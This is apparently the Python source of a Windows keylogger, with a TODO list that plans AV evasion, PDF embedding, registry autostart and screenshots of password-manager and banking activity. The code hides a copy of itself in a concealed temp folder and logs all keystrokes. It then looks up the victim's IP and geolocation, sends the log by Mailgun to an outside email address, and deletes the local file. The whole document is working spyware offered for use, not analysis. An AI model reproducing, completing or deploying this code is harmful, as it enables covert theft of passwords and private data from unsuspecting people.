# ✔️ Add SMTP or POST Request function to send log files and THEN remove the log file on the targets PC 
# ✔️ Get targets IP
# ✔️ Add .env file for credentials
# ✔️ Obfuscate the code so that it cannot be read
# Compress/Encrypt the executable
# Add AV evasion techniques
# Relocate executable to temp location
# Embbed into a pdf
# Add registry for autostart
# Add feature to screenshot when a process starts (password managers, banking websites, etc...)

from pynput import keyboard
from dotenv import load_dotenv
import requests
import os
import shutil
from random import randint
import win32con, win32api


#Load env variables
load_dotenv()


def hide_program():
    #Copies the executable to a generated dir, and makes the folder invisible
    drop_path = os.environ.get('TEMP') + "\\.tmp" + str(randint(0, 99999))


    os.makedirs(drop_path)

    #Makes folder/file invisible
    win32api.SetFileAttributes(drop_path,win32con.FILE_ATTRIBUTE_HIDDEN)

    print(drop_path)
    shutil.copy(__file__, drop_path)
    
hide_program()


#Write to log file
f = open("log.txt", "a")


#Log keystrokes on press
def on_press(key):
    try:
        print('alphanumeric key {0} pressed'.format(
            key.char))
    except AttributeError:
        print('special key {0} pressed'.format(
            key))
    f.write('{0}'.format(key))



#Log keystrokes on release and get target info and send logged text file to email.
def on_release(key):
    print('{0} released'.format(
        key))
    if key == keyboard.Key.esc:
        # Stop listener
        f.close()


        def mailing():
            mail_apikey = os.environ.get("MAIL_APIKEY")
            ip_apikey = os.environ.get("IP_APIKEY")

            #Get IP info.
            ipinfo = requests.get("https://geo.ipify.org/api/v1?apiKey=" + str(ip_apikey)).json()

            requests.post(
            "https://api.mailgun.net/v3/sandboxad10bda10dae43e39b2c8a3d6a849abf.mailgun.org/messages",
            auth=("api", f"{mail_apikey}"),
            data={
                "from": "Mailgun Sandbox <postmaster@sandboxad10bda10dae43e39b2c8a3d6a849abf.mailgun.org>",
                "to": "Host <l0wk3yiaan@protonmail.com>",
                "subject": "Log File For Target: " + ipinfo["ip"],
                "text": "Log file for target:\n\nIP:" + ipinfo["ip"] + "\nLatitude:" + str(ipinfo["location"]["lat"]) + "\nLongitude:" + str(ipinfo["location"]["lng"]) 
                },
            files=[("attachment", ("log.txt", open("log.txt", "rb").read()))])

        mailing()
        os.remove('log.txt')
        return False
        

# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:

    listener.join()

# ...or, in a non-blocking fashion:
listener = keyboard.Listener(
    on_press=on_press,
    on_release=on_release)

listener.start()